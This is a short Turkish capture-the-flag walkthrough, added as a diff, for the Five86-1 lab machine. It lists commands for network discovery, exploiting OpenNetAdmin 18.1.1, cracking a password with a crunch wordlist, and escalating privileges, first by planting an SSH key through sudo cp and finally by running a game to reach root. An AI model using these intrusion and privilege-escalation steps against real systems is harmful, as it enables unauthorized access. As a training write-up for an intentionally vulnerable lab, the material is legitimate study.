@@ -1,0 +1,20 @@
+FIVE86-1 MAKİNE ÇÖZÜMÜ
+1 - netdiscover -i eth0 (192.168.2.118)
+2 - nmap -sT -A 192.168.2.118
+3 - Çıkan sonuçta bir web server yürütüldüğü görüldü. robots.txt dosyasında /ona dizini
+görüldü. Girip Kontrol edildiğinde OpenNetAdmin sunucusu olduğu ortaya çıktı.
+4 - OpenNetAdmin v18.1.1 https://www.exploit-db.com/exploits/47691
+5 - cat login.php ve bize douglas kullanıcısını ve parolasının hashini verir.
+6 - crunch 10 10 aefhrt -o five86_1_douglas.txt
+7 - ssh douglas@192.168.2.118
+8 - sudo -l komutu sonrası jen kullanıcısını görürüz.
+9 - ssh-keygen -b 2048
+10 - cp .ssh/id_rsa.pub /tmp/authorized_keys
+11 - sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh
+12 - ssh jen@192.168.2.118
+13 - jen kullanıcısına giriş yapınca 1 mail bildirimi görürürüz.
+14 - cat /var/mail/jen, moss isminde bir kullanıcı var ve parolası Fire!Fire!
+15 - su moss
+16 - ls -la /home/moss, .games isminde bir klasör görürüz.
+17 - ls -la /home/moss/.games, upyourgame oyununu görürüz
+18 - ./upyourgame, sorulara cevap vererek root kullanıcısı oluruz.
